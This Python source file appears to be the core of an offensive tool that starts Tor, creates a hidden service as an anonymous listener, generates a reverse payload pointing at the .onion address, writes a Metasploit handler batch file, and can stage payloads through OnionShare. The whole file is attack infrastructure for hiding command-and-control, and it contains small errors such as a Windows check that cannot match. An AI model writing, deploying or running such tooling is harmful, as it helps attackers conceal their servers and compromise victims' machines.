import os
import sys
import time
import subprocess
import shutil
import signal
from stem.control import Controller
from subprocess import check_output
from helpers import generate_onionshare_stager, generate_rc_payload, generate_msfc_batch


def parameters_handler(exploit=None, payload=None, lport=None, rport=None, lhost=None, output=None, onion_ftp=False):
    # Check if tor is installed
    rc = subprocess.call(['which', 'tor'], stdout=subprocess.PIPE)
    if rc:
        print('\n')
        print('[!] Unable to find tor! Exaiting..')
        exit(0)
    else:
        # Start tor
        print(' * Starting tor network..')
        os.system("service tor start")
        os.system('service tor restart')
        os.system('nohup tor --quite &')
        # os.system("tor --quiet &")
    # Give some time to start tor circuit.
    time.sleep(6)
    with Controller.from_port() as controller:
        controller.authenticate()
        # Create a directory for hidden service
        hidden_service_dir = os.path.join(controller.get_conf('DataDirectory', os.getcwd()), 'hidden_service_data')
        # Create a hidden service where visitors of port 80 get redirected to local
        # port 5000
        try:
            print(" * Creating hidden service in %s" % hidden_service_dir)
            result = controller.create_hidden_service(hidden_service_dir, rport, target_port=lport)
        except:
            print("[!] Unable to connect ! Is tor running and dir writable? Exiting..")
            exit(0)

        # Check if onion_ftp is needed
        if onion_ftp:
            generate_onionshare_stager(os.getcwd() + '/public/px.rdx')
        # The hostname is only available when we can read the hidden service
        # directory. This requires us to be running with the same user as tor process.
        if result.hostname:
            print(" * Service is available at %s redirecting to local port %d" % (result.hostname, lport))
            # Generate payload
            generate_rc_payload(result.hostname, payload, output)
            # Generate metasploit batch file
            generate_msfc_batch(exploit, payload, lhost, lport)
            print('\n')
        else:
            print(
                "* Unable to determine our service's hostname, probably due to being unable to read the hidden "
                "service directory. Exiting..")
            exit(0)

        try:
            input("\x1b[6;30;42m * RUNNING - <enter> to quit\x1b[0m")
        finally:
            # Shut down the hidden service and clean it off disk. Note that you *don't*
            # want to delete the hidden service directory if you'd like to have this
            # same *.onion address in the future.
            print(" * Shutting down hidden service and clean it off disk")
            controller.remove_hidden_service(hidden_service_dir)
            shutil.rmtree(hidden_service_dir)
            print(" * Shutting down onionshare")
            onion_share = 'onionshare-cli' if sys.platform == 'nt' else 'onionshare'
            os.kill(int(check_output(["pidof", onion_share])), signal.SIGTERM)
            print(" * Shutting down tor")
            os.kill(int(check_output(["pidof", "tor"])), signal.SIGTERM)
            os.system("service tor stop")

